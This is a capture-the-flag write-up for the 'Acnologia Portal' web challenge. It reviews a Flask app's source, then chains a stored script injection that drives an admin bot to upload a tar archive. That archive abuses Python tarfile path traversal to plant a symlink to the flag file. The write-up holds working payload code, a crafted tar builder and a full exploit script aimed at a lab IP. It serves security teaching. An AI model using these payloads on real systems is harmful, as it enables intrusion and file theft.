# Acnologia Portal

> Bonnie has confirmed the location of the Acnologia spacecraft operated by the Golden Fang mercenary. Before taking over the spaceship, we need to disable its security measures. Ulysses discovered an accessible firmware management portal for the spacecraft. Can you help him get in?

---

## Dockerfile

- `python3-alpine` base Docker image
- `chromium`, `chromium-chromedriver` packages installed
- `selenium`, `Flask`, `Flask-SQLAlchemy`, & `Flask-Login` Python packages installed
- Flag at `/flag.txt`.
- User: `www`
- App root: `/app`


## Entrypoint: `application/run.py`

1. Calls `application.database.migrate_db()`
2. Runs on `0.0.0.0`:`1337`

## `application/main.py`

1. Pulls Flask configuration from `application/config.py`
2. Registers two route blueprints:
	- `web`: `/`
	- `api`: `/api`

## `application/config.py`

1. Uses `application.util.generate()` to generate `SECRET_KEY`
2. Sets `ADMIN_USERNAME` to `admin`
3. Uses `application.util.generate()` to generate `ADMIN_PASSWORD
4. Sets `UPLOAD_FOLDER`
5. Sets `SQLALCHEMMY_DATABASE_URI` to `sqlite://database.db`

```python
from application.util import generate
import os

class Config(object):
    SECRET_KEY = generate(50)
    UPLOAD_FOLDER = f'{os.getcwd()}/application/static/firmware_extract'
    ADMIN_USERNAME = 'admin'
    ADMIN_PASSWORD = generate(15)
    SESSION_PERMANENT = False
    SESSION_TYPE = 'filesystem'
    SESSION_KEY_PREFIX = ''
    SESSION_FILE_THRESHOLD = 20
    SESSION_USE_SIGNER = False
    SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
    SQLALCHEMY_TRACK_MODIFICATIONS = False

class ProductionConfig(Config):
    pass

class DevelopmentConfig(Config):
    DEBUG = True

class TestingConfig(Config):
    TESTING = True
```

## `application/util.py`

Defines three functions:

1. `generate(x)`: generates `x` random hex characters
2. `is_admin(f)`: decorator that runs the decorated function if the following are true:
	- `current_user.username` == `current_app.config["ADMIN_USERNAME"]` == `admin`
	- `request.remote_addr` == `127.0.0.1`
	- `extract_firmware(file)`:
		1. Saves `file` on disk to a random path
		2. Returns `False` if `file` isn't a `tar` file
		3. Extracts the `tar` file

```python
import functools, tarfile, tempfile, os
from flask_login import current_user
from flask import current_app, abort, request

generate = lambda x: os.urandom(x).hex()

def is_admin(f):
    @functools.wraps(f)
    def wrap(*args, **kwargs):
        if current_user.username == current_app.config['ADMIN_USERNAME'] and request.remote_addr == '127.0.0.1':
            return f(*args, **kwargs)
        else:
            return abort(401)

    return wrap

def extract_firmware(file):

    # /tmp
    tmp  = tempfile.gettempdir()  

    # /tmp/$file.filename (directory traversal?)
    path = os.path.join(tmp, file.filename)
    file.save(path)
  
    # Ensure $path is a tar
    if tarfile.is_tarfile(path):  

        # $path should be a gzip compressed tar archive
        tar = tarfile.open(path, 'r:gz')  

        # Extract `/tmp/$file.filename` to `/tmp`
		# Potential vulnerability? https://medium.com/ochrona/python-path-traversal-prevention-the-tarbomb-5be58f06dd70
		# What is the tar contains a symlink ../app/application/static/flag.txt -> /flag.txt?
        tar.extractall(tmp)
  
        # /app/application/static/firmware_extract/$rand_dir/'
        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name  

            # Only regular files...
            if tarinfo.isreg():
                try:  

                    # /app/application/static/firmware_extract/$rand_dir/$tarinfo.name
                    filename = f'{extractdir}/{name}'  

                    # move /tmp/$tarinfo.name to /app/application/static/firmware_extract/$rand_dir/$tarinfo.name
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass  

            # Create directory /app/application/static/firmware_extract/$rand_dir/$tarinfo.name/
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```

## Routes

### Web Routes

#### `GET /`

Renders `login.html`.

#### `POST /login`

1. Takes JSON body with `username` and `password` keys
2. Fetches the first user from the database where `username=username`
3. Ensures that user exists and the passwords match (no hashing)
4. Logs in the user

#### `GET /register`

Renders `register.html`.

#### `POST /register`

1. Takes JSON body with `username` and `password` keys
2. Ensures user with `username` doesn't already exist
3. Creates a new user in the database with `username` and `password`

#### `GET /dashboard`

Renders `dashboard.html`.

#### `GET /review`

1. Must be logged in as `admin`
	- Enforced by these decorators:
		- `@login_required`
		- `@is_admin`
2. Retrieves all Reports objects
3. Renders `review.html` template with `reports`= all Reports objects

#### `/logout`

Logs the current user out.

### API Routes

####  `GET /firmware/list`

1. Must be logged in
1. Retrieves all Firmware objects from the database
2. Returns them as a JSON list

#### `POST /firmware/report`

1. Must be logged in
1. Takes a JSON body with keys `module_id` and `issue`
2. Creates a new Report object with `module_id`=`module_id`, `issue`=`issue`, and `reported_by`=`current_user.username`
3. Runs `application.bot.visit_report()`
4. Runs `application.database.migrate_db()`

#### `POST /firmware/upload`

1. Must be logged in as `admin`
	- Enforced by these decorators:
		- `@login_required`
		- `@is_admin`
2. Takes uploaded `file`
3. Runs `application.util.extract_firmware(file)`

## `application/bot.py`

### `visit_report()`

1. Leverages `selenium` to open a headless Chrome browser
2. Browses to `/` (login form)
3. Logs in as `admin`
4. As `admin`, browses to `/review`

## Strategy

1. Register an account
2. `POST /firmware/report` to create a report with CSRF payload in `issue`
	- `application.bot.visit_report()` will cause `admin` to retrieve the reports and render `reports.html` with them, executing the CSRF payload
	- CSRF payload should cause `admin` to `POST /firmware/upload` with the payload tar
3. Payload tar:
	- Python's `tarfile` library is vulnerable to [Tarbombing](https://medium.com/ochrona/python-path-traversal-prevention-the-tarbomb-5be58f06dd70)
		- When `tarfile.extractall()` is called, any files in the tar with relative paths will be written via their relative paths, making it possible to write anywhere on the filesystem
		- By writing a symbolic link to `/flag.txt` at a browsable path, it may be possible to read the flag
4. Read the flag at `http://$IP:$PORT/static/flag`

Create the symbolic link to `/flag.txt`.

```bash
$ ln -s /flag.txt ./flag
```

Create the tar archive payload to write the symbolic link to `/flag.txt` to a browsable path, `/static/flag`.

```python
import tarfile


with tarfile.open("./blah.tar", "w:gz") as t:
    t.add("./flag", "../../../../../../../../../../app/application/static/flag")
    t.close()
```

CSRF payload to upload tar payload:

```javascript
// Base64-decode tar payload
let tarEncoded = "H4sICMaUhWIC/2JsYWgudGFyAO3UTW7CMBCGYa97ipzAP5M4bhdILFlyBYuGYAnaKBgpx4fAgkpVqViQSuV9ZOsb2ZZmNdZGm/kyDosmvje9egh78VNaW1bXejx3VpyoYlATOOxz7E/t1XOS12KX066ZudrLm7iqLrWUEqq6elH497Q2N1bsunFv0yrm9PlhTrOS08qst7G9c/5DCGO64O3XtN/+grEW571XhZwb6TzkCeY/t2mzvvHut3sAAAAAAAAAAAAAAADgDxwBheRoCgAoAAA=";
var binary = atob(tarEncoded);
var array = new Uint8Array(binary.length);
for( var i = 0; i < binary.length; i++ ) { array[i] = binary.charCodeAt(i) };
let tar = new Blob([array]);

// Create tar file object and form
let file = new File([tar], "blah.tar", {type: "application/octet-stream"});
let form = new FormData();
form.append("file", file);

// Submit tar upload request
fetch("http://localhost:1337/api/firmware/upload", {method: "POST", body: form}).then(response => null);
```

Python script to register an account, login, submit the CSRF payload, and read the flag.

```python
import requests


target = "138.68.150.120:31570"
csrf_payload = '''<script>
let tarEncoded = "H4sICMaUhWIC/2JsYWgudGFyAO3UTW7CMBCGYa97ipzAP5M4bhdILFlyBYuGYAnaKBgpx4fAgkpVqViQSuV9ZOsb2ZZmNdZGm/kyDosmvje9egh78VNaW1bXejx3VpyoYlATOOxz7E/t1XOS12KX066ZudrLm7iqLrWUEqq6elH497Q2N1bsunFv0yrm9PlhTrOS08qst7G9c/5DCGO64O3XtN/+grEW571XhZwb6TzkCeY/t2mzvvHut3sAAAAAAAAAAAAAAADgDxwBheRoCgAoAAA=";
var binary = atob(tarEncoded);
var array = new Uint8Array(binary.length);
for( var i = 0; i < binary.length; i++ ) { array[i] = binary.charCodeAt(i) };
let tar = new Blob([array]);
let file = new File([tar], "blah.tar", {type: "application/octet-stream"});
let form = new FormData();
form.append("file", file);
fetch("http://localhost:1337/api/firmware/upload", {method: "POST", body: form}).then(response => null);
</script>
'''.replace("\n", ' ')

# Register user
response = requests.post(
    f"http://{target}/api/register",
    json={
        "username": "tgihf",
        "password": "blah"
    }
)
assert response.status_code == 200

with requests.session() as session:

    # Login
    response = session.post(
        f"http://{target}/api/login",
        json={
            "username": "tgihf",
            "password": "blah"
        }
    )
    assert response.status_code == 200

    # Submit CSRF payload
    response = session.post(
        f"http://{target}/api/firmware/report",
        json={
            "module_id": 42,
            "issue": csrf_payload
        }
    )
    assert response.status_code == 200

    # Retrieve flag
    response = session.get(f"http://{target}/static/flag")
    assert response.status_code == 200
    print(response.text)
```

```bash
$ python3 exploit.py
HTB{...}
```
